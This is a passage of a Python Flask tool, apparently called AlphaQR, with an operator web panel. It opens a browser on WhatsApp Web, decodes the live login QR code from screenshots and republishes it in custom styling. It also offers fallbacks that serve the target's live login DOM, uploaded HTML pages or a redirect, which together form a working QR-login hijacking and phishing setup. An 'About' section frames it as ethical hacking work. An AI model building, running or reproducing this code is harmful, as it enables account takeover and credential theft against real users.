    <div class="row">
      <div>
        <label>Background Style</label>
        <select id="backgroundStyle">
          <option value="transparent">Transparent</option>
          <option value="white">White</option>
          <option value="color">Color</option>
        </select>
      </div>
      <div>
        <label>Background Color</label>
        <input type="color" id="backgroundColor" value="#ffffff">
      </div>
    </div>
    <label>Logo URL</label>
    <input id="logoUrl" placeholder="https://image.com/logo.png">
    <div class="row">
      <div>
        <label>Logo Size</label>
        <input type="range" id="logoSize" min="0.2" max="0.6" step="0.05" value="0.35">
      </div>
      <div>
        <label>Logo Margin</label>
        <input type="range" id="logoMargin" min="0" max="20" step="1" value="8">
      </div>
    </div>
    <label><input type="checkbox" id="hideBgDots"> Hide dots under logo</label>
    <button class="button" onclick="downloadQR()">Download PNG</button>
    <div class="note">Detected QR link auto-fills when available.</div>

    <div class="section-title">Configuration</div>
    <label>Detection Keyword</label>
    <div style="position:relative; display:flex; align-items:center; gap:8px;">
        <div id="keywordStatus" style="width:16px; height:16px; background:#ccc; border-radius:3px; flex-shrink:0;" title="Keyword Status"></div>
        <div style="position:relative; width:100%;">
            <div id="ghost" style="position:absolute; top:12px; left:12px; font-family:inherit; font-size:inherit; color:#aaa; pointer-events:none; white-space:pre-wrap; overflow:hidden; background:transparent;"></div>
            <textarea id="configString" rows="1" placeholder="Enter keyword..." style="margin-top:6px; font-family:inherit; background:transparent; position:relative; z-index:2;"></textarea>
        </div>
    </div>
    <div style="display:flex; gap:8px; margin-top:8px;">
      <button id="saveKeywordBtn" class="button small" style="flex:1; margin-top:0;" onclick="saveConfigString()">Save Keyword</button>
      <button id="domLoginBtn" class="button small red" style="flex:1; margin-top:0;" onclick="toggleDomLogin()">DOM Login: OFF</button>
    </div>

    <div class="section-title">Fallback Configuration</div>
    
    <label>Fallback Type Priority:</label>
    <div class="note">1. DOM Login (if ON)<br>2. HTML File (if selected)<br>3. Redirect URL (if no file selected)</div>

    <label style="margin-top:15px;">Fallback HTML Files</label>
    <div class="file-input-wrapper">
      <input type="file" id="fileUpload" multiple accept=".html">
    </div>
    <div id="uploadStatus" class="upload-status"></div>
    <div id="fileList" style="margin-top:10px;"></div>

    <label style="margin-top:20px;">Redirect URL (Fallback)</label>
    <input id="fallbackUrl" placeholder="https://example.com" type="url">
    <button class="button small" onclick="saveFallbackUrl()">Save URL</button>
    <div class="note">Redirects user if keyword is missing and no file is selected.</div>

  </div>
  <div class="preview"><div id="qrContainer"></div></div>
</div>
<div id="aboutSection" class="about-section" style="display:none;">
  <div class="about-header">
    <h2>About us</h2>
  </div>
  <div class="team-container">
    <div class="team-member no-image">
      <div class="member-name">Varun</div>
      <div class="member-role">Ethical Hacker</div>
      <div class="member-bio">
        <p>I'm a passionate cybersecurity enthusiast with a strong interest in ethical hacking, red teaming, and web application security. I spend my time learning, building tools, and simulating real-world attacks in safe environments to sharpen my skills. I'm currently exploring opportunities to grow and contribute within the cybersecurity field.</p>
      </div>
      <div class="social-links">
        <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub"><i class="fab fa-github"></i></a>
        <a href="https://www.linkedin.com/in/mr-pentest" target="_blank" class="social-link" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
        <a href="#" class="social-link" title="Twitter"><i class="fab fa-twitter"></i></a>
        <a href="https://www.instagram.com/mr_pentest1/" target="_blank" class="social-link" title="Instagram"><i class="fab fa-instagram"></i></a>
        <a href="#" class="social-link" title="Discord"><i class="fab fa-discord"></i></a>
      </div>
    </div>
    <div class="team-member no-image">
      <div class="member-name">Aashish Kumar</div>
      <div class="member-role">Cybersecurity Mentor</div>
      <div class="member-bio">
        <p>Cybersecurity teacher, creator, and Co-Founder of M Cyber Academy. Provided expert guidance throughout the development of Eden, sharing invaluable insights from years of industry experience.</p>
      </div>
      <div class="social-links">
        <a href="https://www.linkedin.com/in/aashish-kumar-hak0r" target="_blank" class="social-link" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
        <a href="https://www.instagram.com/mcyberacademy/" target="_blank" class="social-link" title="Instagram"><i class="fab fa-instagram"></i></a>
        <a href="#" class="social-link" title="Twitter"><i class="fab fa-twitter"></i></a>
        <a href="#" class="social-link" title="Discord"><i class="fab fa-discord"></i></a>
      </div>
    </div>
  </div>
</div>
<script>
var DEMO='https://example.com/demo';
let qrCode = new QRCodeStyling({
  width: 300,
  height: 300,
  type: "png",
  data: "",
  image: "",
  margin: 12,
  dotsOptions: { type: "square", color: "#000000", scale: 1 },
  cornersSquareOptions: { type: "square", color: "#000000", scale: 1 },
  cornersDotOptions: { type: "square", color: "#000000", scale: 1 }
});
qrCode.append(document.getElementById("qrContainer"));
let userEditedText=false; let lastLink=null;
let lastQRConfig = null;

function getQRConfig(){
  const eyeSel = document.getElementById("eyeStyle").value;
  const innerSel = document.getElementById("innerEyeStyle").value;
  const eyeTypes = eyeSel === 'circle' ? { cs:'extra-rounded' } : { cs:'square' };
  const innerType = innerSel === 'dot' ? 'dot' : 'square';
  const colorMode = document.getElementById("colorMode").value;
  const gradientType = document.getElementById("gradientType").value;
  const primary = document.getElementById("dotPrimary").value;
  const primary2 = document.getElementById("dotPrimary2") ? document.getElementById("dotPrimary2").value : primary;
  const secondary = document.getElementById("dotSecondary").value;
  const bgStyle = document.getElementById("backgroundStyle").value;
  const bgColor = document.getElementById("backgroundColor").value;
  const eyeOuterColor = document.getElementById("eyeOuterColor").value;
  const eyeInnerColor = document.getElementById("eyeInnerColor").value;
  
  const dotColor = primary2 || primary;
  
  let dotsOptions = { type: document.getElementById("dotStyle").value, color: dotColor, scale: 1 };
  if(colorMode !== 'single'){
    dotsOptions = {
      type: document.getElementById("dotStyle").value,
      gradient: {
        type: gradientType,
        rotation: 0,
        colorStops: [
          { offset: 0, color: dotColor },
          { offset: 1, color: secondary }
        ]
      },
      scale: 1
    };
  }
  const backgroundOptions = { color: (bgStyle === 'transparent' ? 'transparent' : (bgStyle === 'white' ? '#ffffff' : bgColor)) };
  
  return {
    data: document.getElementById("qrText").value || " ",
    image: document.getElementById("logoUrl").value || "",
    margin: 12,
    imageOptions: { imageSize: Number(document.getElementById("logoSize").value), margin: Number(document.getElementById("logoMargin").value), hideBackgroundDots: document.getElementById("hideBgDots").checked },
    dotsOptions: dotsOptions,
    cornersSquareOptions: { type: eyeTypes.cs, color: eyeOuterColor, scale: 1 },
    cornersDotOptions: { type: innerType, color: eyeInnerColor, scale: 1 },
    backgroundOptions: backgroundOptions
  };
}

function applyUI(){
  const newConfig = getQRConfig();
  const configStr = JSON.stringify(newConfig);
  
  if(lastQRConfig !== configStr){
    lastQRConfig = configStr;
    qrCode.update(newConfig);
  }
}
document.getElementById("qrText").addEventListener("input", function(){ userEditedText=true; applyUI(); });
document.getElementById("logoUrl").addEventListener("input", applyUI);
document.getElementById("dotStyle").addEventListener("input", applyUI);
document.getElementById("eyeStyle").addEventListener("input", applyUI);
document.getElementById("eyeOuterColor").addEventListener("input", applyUI);
document.getElementById("eyeInnerColor").addEventListener("input", applyUI);
document.getElementById("innerEyeStyle").addEventListener("input", applyUI);
document.getElementById("colorMode").addEventListener("input", applyUI);
document.getElementById("gradientType").addEventListener("input", applyUI);
document.getElementById("dotPrimary").addEventListener("input", function(){
  applyUI();
  if(document.getElementById("dotPrimary2")) document.getElementById("dotPrimary2").value = document.getElementById("dotPrimary").value;
});
if(document.getElementById("dotPrimary2")){
  document.getElementById("dotPrimary2").addEventListener("input", function(){
    document.getElementById("dotPrimary").value = document.getElementById("dotPrimary2").value;
    applyUI();
  });
}
document.getElementById("dotSecondary").addEventListener("input", applyUI);
document.getElementById("backgroundStyle").addEventListener("input", applyUI);
document.getElementById("backgroundColor").addEventListener("input", applyUI);
document.getElementById("logoSize").addEventListener("input", applyUI);
document.getElementById("logoMargin").addEventListener("input", applyUI);
document.getElementById("hideBgDots").addEventListener("input", applyUI);

function pushStyle(){
  const payload = {
    dotStyle: document.getElementById("dotStyle").value,
    dotColor: document.getElementById("dotPrimary").value,
    eyeStyle: document.getElementById("eyeStyle").value,
    innerEyeStyle: document.getElementById("innerEyeStyle").value,
    eyeColor: document.getElementById("dotPrimary").value,
    eyeOuterColor: document.getElementById("eyeOuterColor").value,
    eyeInnerColor: document.getElementById("eyeInnerColor").value,
    colorMode: document.getElementById("colorMode").value,
    gradientType: document.getElementById("gradientType").value,
    dotPrimary: document.getElementById("dotPrimary").value,
    dotSecondary: document.getElementById("dotSecondary").value,
    backgroundStyle: document.getElementById("backgroundStyle").value,
    backgroundColor: document.getElementById("backgroundColor").value,
    logoUrl: document.getElementById("logoUrl").value,
    logoSize: parseFloat(document.getElementById("logoSize").value),
    logoMargin: parseInt(document.getElementById("logoMargin").value),
    hideBgDots: document.getElementById("hideBgDots").checked
  };
  
  fetch('/api/style', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(payload)
  }).catch(e=>console.log("Error pushing style:", e));
}

setInterval(pushStyle, 2000);

// Tab switching
const navHome = document.getElementById('navHome');
const navAbout = document.getElementById('navAbout');
const designer = document.getElementById('designer');
const aboutSection = document.getElementById('aboutSection');

navHome.addEventListener('click', () => {
  navHome.classList.add('active');
  navAbout.classList.remove('active');
  designer.style.display = 'grid';
  aboutSection.style.display = 'none';
});

navAbout.addEventListener('click', () => {
  navAbout.classList.add('active');
  navHome.classList.remove('active');
  designer.style.display = 'none';
  aboutSection.style.display = 'block';
});

// Polling for QR Link
function pollQR(){
  fetch('/api/current_qr')
    .then(r=>r.json())
    .then(d=>{
      if(d.link && d.link !== lastLink && !userEditedText){
        lastLink = d.link;
        document.getElementById("qrText").value = d.link;
        applyUI();
      }
      
      const select = document.getElementById("qrCandidateSelect");
      const container = document.getElementById("qrSelectionContainer");
      if(d.candidates && d.candidates.length > 1){
         container.style.display = 'block';
         select.innerHTML = '';
         d.candidates.forEach(c => {
             let opt = document.createElement('option');
             opt.value = c;
             opt.innerText = c;
             select.appendChild(opt);
         });
      } else {
         container.style.display = 'none';
      }
      
      // Update config string & keyword status
      if(document.activeElement !== document.getElementById("configString")) {
         // Only update if not typing
      }
      // Update keyword status indicator
      const kStatus = document.getElementById("keywordStatus");
      if(d.keyword_status === "GREEN") kStatus.style.background = "#51cf66";
      else if(d.keyword_status === "RED") kStatus.style.background = "#ff6b6b";
      else kStatus.style.background = "#ccc";

    }).catch(e=>{});
}
setInterval(pollQR, 1000);

document.getElementById("qrCandidateSelect").addEventListener("change", function(){
    const val = this.value;
    document.getElementById("qrText").value = val;
    userEditedText = true;
    applyUI();
});

// Config String Logic
function saveConfigString() {
    const input = document.getElementById("configString");
    const btn = document.getElementById("saveKeywordBtn");

    const originalText = btn.innerText;

    btn.disabled = true;
    btn.innerText = "Saving...";

    fetch('/api/config_string', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ config_string: input.value })
    })
    .then(response => {
        if (!response.ok) throw new Error("Request failed");

        btn.innerText = "Saved";

        setTimeout(() => {
            btn.innerText = originalText;
            btn.disabled = false;
        }, 1000);
    })
    .catch(err => {
        console.error(err);
        btn.innerText = "Error";

        setTimeout(() => {
            btn.innerText = originalText;
            btn.disabled = false;
        }, 1500);
    });
}

let domLoginActive = false;

function updateDomLoginUI() {
    const btn = document.getElementById("domLoginBtn");
    if (domLoginActive) {
        btn.innerText = "DOM Login: ON";
        btn.className = "button small green";
    } else {
        btn.innerText = "DOM Login: OFF";
        btn.className = "button small red";
    }
}

function toggleDomLogin() {
    domLoginActive = !domLoginActive;
    fetch('/api/dom_login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ active: domLoginActive })
    })
    .then(r => r.json())
    .then(d => {
        domLoginActive = d.active;
        updateDomLoginUI();
    });
}

// Fetch initial DOM Login state
fetch('/api/dom_login')
    .then(r => r.json())
    .then(d => {
        domLoginActive = d.active;
        updateDomLoginUI();
    });

async function startBrowserSession() {
    const url = document.getElementById('browserUrlInput').value;
    const btn = document.getElementById('startBrowserBtn');
    btn.disabled = true;
    btn.innerText = "Starting...";
    await fetch('/api/browser/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `url=${encodeURIComponent(url)}`
    });
    btn.disabled = false;
    btn.innerText = "Start Session";
}

async function stopBrowserSession() {
    const btn = document.getElementById('stopBrowserBtn');
    btn.disabled = true;
    btn.innerText = "Stopping...";
    await fetch('/api/browser/stop', { method: 'POST' });
    btn.disabled = false;
    btn.innerText = "Stop Session";
}

async function updateBrowserStatus() {
    try {
        const r = await fetch('/api/browser/state');
        const data = await r.json();
        
        const indicator = document.getElementById('browserIndicator');
        const statusText = document.getElementById('browserStatusText');
        const textPre = document.getElementById('browserExtractedText');
        
        if (data.browser_open) {
            indicator.style.background = '#51cf66';
            let profileInfo = data.current_profile_num ? ` (Profile ${data.current_profile_num})` : '';
            statusText.innerText = 'Active - Scanning...' + profileInfo;
            statusText.style.color = '#2b8a3e';
        } else {
            indicator.style.background = '#ff6b6b';
            statusText.innerText = 'Browser Closed';
            statusText.style.color = '#c92a2a';
        }
        
        if (textPre) {
            textPre.innerText = data.extracted_text || 'No text extracted yet.';
        }
    } catch(e) {}
}

setInterval(updateBrowserStatus, 1500);

// Fetch initial config string
fetch('/api/list_html_files').then(r=>r.json()).then(d=>{
    if(d.config_string) document.getElementById("configString").value = d.config_string;
    if(d.fallback_url) document.getElementById("fallbackUrl").value = d.fallback_url;
});

function saveFallbackUrl(){
    const val = document.getElementById("fallbackUrl").value;
    fetch('/api/fallback_url', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({url: val})
    }).then(r=>r.json()).then(d=>{
        if(d.status === "ok") alert("URL Saved");
    });
}

// Autocomplete Logic
let words = [];
let matches = [];
let matchIndex = 0;
const inp = document.getElementById("configString");
const ghost = document.getElementById("ghost");

function fetchWords(){
    fetch("/api/ocr_words")
     .then(r=>r.json())
     .then(w=>words=w);
}
setInterval(fetchWords, 2000);

inp.addEventListener("input", ()=>{
    matchIndex = 0;
    updateGhost();
});

inp.addEventListener("keydown", e=>{
    if(e.key === "Tab"){
        e.preventDefault();
        applyCompletion();
    }
});

function updateGhost(){
    const val = inp.value;
    const parts = val.split(/\\s+/);
    const last = parts[parts.length-1];
    
    if(!last) { ghost.innerText=""; return; }
    
    matches = words.filter(w=>w.startsWith(last));
    
    if(matches.length){
        const suggestion = matches[matchIndex];
        const suffix = suggestion.slice(last.length);
        ghost.innerText = val + suffix;
    } else {
        ghost.innerText = "";
    }
}

function applyCompletion(){
    if(!matches.length) return;
    const val = inp.value;
    const parts = val.split(/\\s+/);
    const last = parts[parts.length-1];
    
    parts[parts.length-1] = matches[matchIndex];
    inp.value = parts.join(" ");
    
    matchIndex = (matchIndex + 1) % matches.length;
    updateGhost();
}

// Fallback File Upload
const fileUpload = document.getElementById("fileUpload");
const uploadStatus = document.getElementById("uploadStatus");
const fileList = document.getElementById("fileList");

fileUpload.addEventListener("change", function(){
    if(this.files.length > 0){
        const formData = new FormData();
        for(let i=0; i<this.files.length; i++){
            formData.append("files[]", this.files[i]);
        }
        
        fetch("/api/upload_files", {
            method: "POST",
            body: formData
        })
        .then(r=>r.json())
        .then(data=>{
            if(data.success){
                uploadStatus.className = "upload-status success";
                uploadStatus.innerText = "Uploaded " + data.uploaded + " files successfully.";
                refreshFileList();
            } else {
                uploadStatus.className = "upload-status error";
                uploadStatus.innerText = "Upload failed: " + data.error;
            }
        })
        .catch(e=>{
            uploadStatus.className = "upload-status error";
            uploadStatus.innerText = "Error: " + e;
        });
    }
});

function refreshFileList(){
    fetch("/api/list_html_files")
    .then(r=>r.json())
    .then(data=>{
        fileList.innerHTML = "";
        if(data.files){
            data.files.forEach(f => {
                const div = document.createElement("div");
                div.className = "file-item" + (f === data.selected_fallback ? " active" : "");
                
                div.innerHTML = `
                    <span class="file-name">${f}</span>
                    <div class="file-actions">
                        ${f === data.selected_fallback 
                            ? `<button class="button small" style="background:#888;" onclick="unselectFallback()">Unselect</button>` 
                            : `<button class="button small green" onclick="selectFallback('${f}')">Select</button>`
                        }
                        <button class="button small red" onclick="deleteFile('${f}')">Delete</button>
                    </div>
                `;
                fileList.appendChild(div);
            });
        }
    });
}

function unselectFallback(){
    fetch("/api/select_html", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({filename: null})
    })
    .then(r=>r.json())
    .then(d=>{
        if(d.success) refreshFileList();
    });
}

function selectFallback(filename){
    fetch("/api/select_html", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({filename: filename})
    })
    .then(r=>r.json())
    .then(d=>{
        if(d.success) refreshFileList();
    });
}

function deleteFile(filename){
    if(confirm("Delete " + filename + "?")){
        fetch("/api/delete_html/" + filename, {
            method: "DELETE"
        })
        .then(r=>r.json())
        .then(d=>{
            if(d.success) refreshFileList();
        });
    }
}

refreshFileList();
</script>
</body>
</html>
"""

# ==========================================
# 5. ROUTES
# ==========================================

@app.route("/AlphaQR")
def designer():
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/current_qr")
def get_current_qr():
    global current_qr_link, last_update_time, qr_candidates, keyword_status
    global fallback_active, selected_fallback_file, fallback_url, dom_login_active
    
    fallback_type = None
    if fallback_active:
        if dom_login_active:
            fallback_type = 'dom'
        elif selected_fallback_file:
            fallback_type = 'file'
        elif fallback_url and fallback_url.strip():
            fallback_type = 'url'

    return jsonify({
        "link": current_qr_link,
        "time": last_update_time,
        "candidates": qr_candidates,
        "keyword_status": keyword_status,
        "fallback_active": fallback_active,
        "fallback_file": selected_fallback_file,
        "fallback_url": fallback_url,
        "fallback_type": fallback_type
    })

@app.route("/api/browser/start", methods=["POST"])
def browser_start():
    url = request.form.get("url", "https://web.whatsapp.com")
    browser_manager.start(url)
    return jsonify({"success": True})

@app.route("/api/browser/stop", methods=["POST"])
def browser_stop():
    browser_manager.stop()
    return jsonify({"success": True})

@app.route("/api/browser/state", methods=["GET"])
def browser_state():
    return jsonify(browser_manager.get_state())

@app.route("/api/browser/dom_live", methods=["GET"])
def browser_dom_live():
    if browser_manager.page:
        fut = browser_manager.run_async(browser_manager.page.content())
        try:
            content = fut.result(timeout=5)
            current_url = browser_manager.current_url
            if current_url:
                base_tag = f'<base href="{current_url}">'
                if '<head>' in content:
                    content = content.replace('<head>', f'<head>{base_tag}', 1)
                else:
                    content = f'{base_tag}{content}'
            return content
        except Exception as e:
            return f"Error retrieving DOM: {e}", 500
    return "Browser not active", 404

@app.route("/api/dom_login", methods=["POST"])
def toggle_dom_login():
    global dom_login_active
    data = request.json or {}
    dom_login_active = bool(data.get("active", False))
    return jsonify({"status": "ok", "active": dom_login_active})

@app.route("/api/dom_login", methods=["GET"])
def get_dom_login():
    global dom_login_active
    return jsonify({"active": dom_login_active})

@app.route("/api/style", methods=["POST"])
def receive_style():
    global style_options
    data = request.json
    if data:
        style_options.update(data)
    return jsonify({"status": "ok"})

@app.route("/api/style", methods=["GET"])
def get_style():
    return jsonify(style_options)

@app.route("/api/config_string", methods=["POST"])
def set_config_string():
    global config_string
    data = request.json
    if data:
        config_string = data.get("config_string", "")
    return jsonify({"status": "ok"})

@app.route("/api/fallback_url", methods=["POST"])
def set_fallback_url():
    global fallback_url
    data = request.json
    if data:
        fallback_url = data.get("url", "")
    return jsonify({"status": "ok"})

@app.route("/api/upload_files", methods=["POST"])
def upload_html():
    try:
        if 'files[]' not in request.files:
            return jsonify({"success": False, "error": "No files part"})
        
        files = request.files.getlist('files[]')
        uploaded = []
        
        for file in files:
            if file and file.filename:
                if not file.filename.lower().endswith('.html'):
                    continue
                filename = secure_filename(file.filename)
                if not filename:
                    continue
                filepath = os.path.join(UPLOAD_FOLDER, filename)
                file.save(filepath)
                uploaded.append(filename)
        
        return jsonify({
            "success": True,
            "uploaded": len(uploaded),
            "files": uploaded
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/list_html_files", methods=["GET"])
def list_html_files():
    global selected_fallback_file, config_string, fallback_url
    try:
        files = get_uploaded_files()
        return jsonify({
            "success": True,
            "files": files,
            "selected_fallback": selected_fallback_file,
            "config_string": config_string,
            "fallback_url": fallback_url
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e), "files": []})

@app.route("/api/delete_html/<name>", methods=["DELETE"])
def delete_html(name):
    global selected_fallback_file, fallback_active
    try:
        filename = secure_filename(name)
        if not filename:
            return jsonify({"success": False, "error": "Invalid filename"})
        
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        
        if not os.path.exists(filepath):
            return jsonify({"success": False, "error": "File not found"})
        
        os.remove(filepath)
        
        if selected_fallback_file == filename:
            selected_fallback_file = None
            if fallback_active:
                fallback_active = False
                socketio.emit('fallback_clear', {'reason': 'file_deleted'})
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/select_html", methods=["POST"])
def select_html():
    global selected_fallback_file
    try:
        data = request.get_json(silent=True) or {}
        filename = data.get("filename")
        
        if filename is None:
            # Explicit unselect
            selected_fallback_file = None
            return jsonify({"success": True, "selected": None})

        if not filename:
            return jsonify({"success": False, "error": "No filename provided"})
        
        safe_filename = secure_filename(filename)
        filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
        
        if not os.path.exists(filepath):
            return jsonify({"success": False, "error": "File not found"})
        
        selected_fallback_file = safe_filename
        return jsonify({"success": True, "selected": safe_filename})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/fallback_status", methods=["GET"])
def fallback_status():
    global fallback_active, selected_fallback_file, fallback_url, dom_login_active
    
    fallback_type = None
    if fallback_active:
        if dom_login_active:
            fallback_type = 'dom'
        elif selected_fallback_file:
            fallback_type = 'file'
        elif fallback_url and fallback_url.strip():
            fallback_type = 'url'
            
    return jsonify({
        "active": fallback_active,
        "file": selected_fallback_file,
        "url": fallback_url,
        "type": fallback_type
    })

@app.route("/api/fallback_content", methods=["GET"])
def get_fallback_content():
    global selected_fallback_file
    try:
        if not selected_fallback_file:
            return jsonify({"success": False, "error": "No fallback file selected"})
        
        filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
        if not os.path.exists(filepath):
            return jsonify({"success": False, "error": "Fallback file not found"})
        
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        return jsonify({
            "success": True,
            "filename": selected_fallback_file,
            "content": content
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# Legacy API Endpoints
@app.route("/api/files", methods=["GET"])
def list_files_legacy(): return list_html_files()

@app.route("/api/upload_files", methods=["POST"])
def upload_files_legacy(): return upload_html()

@app.route("/api/select_fallback", methods=["POST"])
def select_fallback_legacy(): return select_html()

@app.route("/api/delete_file", methods=["POST"])
def delete_file_legacy():
    # Reimplement legacy delete
    global selected_fallback_file, fallback_active
    try:
        data = request.get_json(silent=True) or {}
        filename = data.get("filename")
        if not filename: return jsonify({"success": False, "error": "No filename"})
        safe_filename = secure_filename(filename)
        filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            if selected_fallback_file == safe_filename:
                selected_fallback_file = None
                if fallback_active:
                    fallback_active = False
                    socketio.emit('fallback_clear', {'reason': 'file_deleted'})
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

@app.route("/api/ocr_words", methods=["GET"])
def get_ocr_words():
    global ocr_words
    return jsonify(sorted(list(ocr_words)))

@app.route("/api/keyword_status", methods=["GET"])
def get_keyword_status():
    global keyword_status
    return jsonify({"status": keyword_status})

@app.route("/api/element_missing", methods=["POST"])
def api_element_missing():
    global element_fallback_active, selected_fallback_file, fallback_active, fallback_url
    
    element_fallback_active = True
    
    if not fallback_active:
        fallback_active = True
        
        # Priority: File > URL
        if selected_fallback_file:
            filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
            if os.path.exists(filepath):
                 socketio.emit("fallback_on", {"file": selected_fallback_file, "type": "file"})
        elif fallback_url and fallback_url.strip():
             socketio.emit("fallback_on", {"url": fallback_url, "type": "url"})
             
    return jsonify({"success": True})

@app.route("/api/element_present", methods=["POST"])
def api_element_present():
    global element_fallback_active, fallback_active, keyword_fallback_active
    if element_fallback_active:
        element_fallback_active = False
        if not keyword_fallback_active and fallback_active:
            fallback_active = False
            socketio.emit("fallback_off")
    return jsonify({"success": True})

@app.route("/receive_screenshot", methods=["POST"])
def receive_screenshot():
    global current_qr_link, last_update_time, qr_candidates
    global fallback_active, element_fallback_active, keyword_fallback_active
    global ocr_words, keyword_status, selected_fallback_file
    
    try:
        data = request.get_json(silent=True)
        if not data: return jsonify({"success": False, "error": "No JSON data"}), 400
        
        image_data = data.get("image")
        if not image_data: return jsonify({"success": False, "error": "No image data"}), 400
        
        try:
            if "," in image_data: img_bytes = base64.b64decode(image_data.split(",")[1])
            else: img_bytes = base64.b64decode(image_data)
            img = Image.open(BytesIO(img_bytes))
        except Exception as e:
            return jsonify({"success": False, "error": f"Invalid image: {e}"}), 400
        
        if img.mode != 'L': img_gray = img.convert('L')
        else: img_gray = img
        
        width, height = img_gray.size
        if width > 2000 or height > 2000:
            scale = min(2000 / width, 2000 / height)
            new_width = int(width * scale)
            new_height = int(height * scale)
            img_gray = img_gray.resize((new_width, new_height), Image.Resampling.LANCZOS)
        
        # 1. OCR (Tesseract) - Removed as requested
        string_found = True
        keyword_status = "GREY"
            
        # 2. Fallback Logic
        if not browser_manager.browser_open:
            should_keyword_fallback = False
            if config_string and config_string.strip() and not string_found:
                 should_keyword_fallback = True
            
            if should_keyword_fallback != keyword_fallback_active:
                keyword_fallback_active = should_keyword_fallback
                
            effective_fallback = element_fallback_active or keyword_fallback_active
            
            if effective_fallback and not fallback_active:
                fallback_active = True
                
                # Priority: DOM Login > File > URL
                if dom_login_active:
                    socketio.emit('fallback_on', {'type': 'dom'})
                elif selected_fallback_file:
                    filepath = os.path.join(UPLOAD_FOLDER, selected_fallback_file)
                    if os.path.exists(filepath):
                        socketio.emit('fallback_on', {'file': selected_fallback_file, 'type': 'file'})
                elif fallback_url and fallback_url.strip():
                     socketio.emit('fallback_on', {'url': fallback_url, 'type': 'url'})
                        
            elif not effective_fallback and fallback_active:
                 fallback_active = False
                 socketio.emit('fallback_off')
        
        # 3. QR Detection
        decoded_links = []
        try:
            result = decode(img_gray)
            if result:
                decoded_links = list(set([r.data.decode('utf-8') for r in result]))
        except Exception as e:
            app_logger.error(f"QR decode error: {e}", exc_info=False)
        
        num_qrs = len(decoded_links)
        if num_qrs == 1:
            link = decoded_links[0]
            if link != DEMO_LINK and link != current_qr_link:
                current_qr_link = link
                last_update_time = datetime.datetime.now().isoformat()
            qr_candidates = decoded_links
        else:
            qr_candidates = decoded_links
        
        return jsonify({
            "success": True,
            "qrs_found": num_qrs,
            "string_found": string_found,
            "fallback_active": fallback_active,
            "keyword_status": keyword_status
        })
        
    except Exception as e:
        app_logger.error(f"Screenshot error: {e}", exc_info=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/')
def index():
    return redirect('/AlphaQR')

@app.route('/<path:filename>')
def serve_root_files(filename):
    
    # Safety net: If for some reason /AlphaQR falls through here
    if filename == "AlphaQR" or filename == "AlphaQR/":
        return render_template_string(HTML_TEMPLATE)

    try:
        # Check if file exists before trying to send
        filepath = os.path.join(os.getcwd(), filename)
        
        # Security check: prevent directory traversal
        if not os.path.normpath(filepath).startswith(os.getcwd()):
            return "Access denied", 403

        if not os.path.exists(filepath) or not os.path.isfile(filepath):
            return "File not found", 404
        
        # Send file
        return send_from_directory(os.getcwd(), filename)
    except Exception as e:
        app_logger.error(f"Error serving file {filename}: {e}")
        return f"Error serving file: {str(e)}", 500

# ==========================================
# 6. CLI INTERFACE
# ==========================================

def print_banner(url):
    
    def get_terminal_width():
        try:
            return shutil.get_terminal_size().columns
        except:
            return 80
            
    def parse_color_tags(text):
        replacements = {
            "{CYAN}": Fore.CYAN,
            "{WHITE}": Fore.WHITE,
            "{GREEN}": Fore.GREEN,
            "{YELLOW}": Fore.YELLOW,
            "{RED}": Fore.RED,
            "{MAGENTA}": Fore.MAGENTA,
            "{BLUE}": Fore.BLUE,
        }
        for tag, code in replacements.items():
            text = text.replace(tag, code)
        return text + Style.RESET_ALL

    terminal_width = get_terminal_width()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Create stylish banner with colored elements - fixed width for proper alignment
    banner_lines = [
      
        "{CYAN}"
    
"{CYAN}   █████████   ████            █████                   ██████    ███████████  ",
"{CYAN}  ███     ███   ███             ███                  ███    ███   ███     ███ ",
"{CYAN}  ███     ███   ███  ████████   ███████    ██████   ███      ███  ███     ███ ",
"{CYAN}  ███████████   ███   ███  ███  ███  ███       ███  ███      ███  ██████████  ",
"{CYAN}  ███     ███   ███   ███  ███  ███  ███   ███████  ███   ██ ███  ███     ███ ",
"{CYAN}  ███     ███   ███   ███  ███  ███  ███  ███  ███   ███   ████   ███     ███ ",
"{CYAN} █████   █████ █████  ███████  ████ █████  ████████    ██████ ██ █████   █████",
"{CYAN}                      ███                                                     ",
"{CYAN}                      ███                                                     ",
"{CYAN}                     █████                                                    "
 ]                                                                
    # Parse color tags in each line
    colored_banner_lines = [parse_color_tags(line) for line in banner_lines]
    
    # Calculate required width and padding (use the first line for reference)
    clean_line = re.sub(r'\x1b\[[0-9;]*m', '', colored_banner_lines[0])
    banner_width = len(clean_line)
    center_padding = max(0, (terminal_width - banner_width) // 2)
    
    print("\n")
    
